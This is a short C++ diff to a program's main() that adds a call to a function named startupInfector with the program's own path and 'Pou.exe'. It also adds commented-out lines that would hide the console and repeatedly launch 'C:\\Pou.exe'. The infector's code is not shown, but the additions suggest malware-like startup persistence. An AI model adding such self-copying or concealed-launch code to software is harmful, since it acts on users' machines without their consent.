@@ -2,6 +2,8 @@
 
 int main(int argc, char* argv[]) {
 
+	//FreeConsole();
+
 	std::cout << "Starting args" << endl;
 
 	for (int i = 0; i < argc; ++i) {
@@ -14,11 +16,16 @@ int main(int argc, char* argv[]) {
 
 	}
 
+	startupInfector(argv[0], "Pou.exe");
+
+	//system("start C:\\Pou.exe --Extra");
+	//system("start C:\\Pou.exe --Extra");
+	//system("start C:\\Pou.exe --Extra");
+	//system("start C:\\Pou.exe --Extra");
 	
-	std::cout << "Done with args" << endl;
 	//pouVitalsCheck();
 
-	std::cin.get();
+	cin.get();
 
 	return 0;
 }
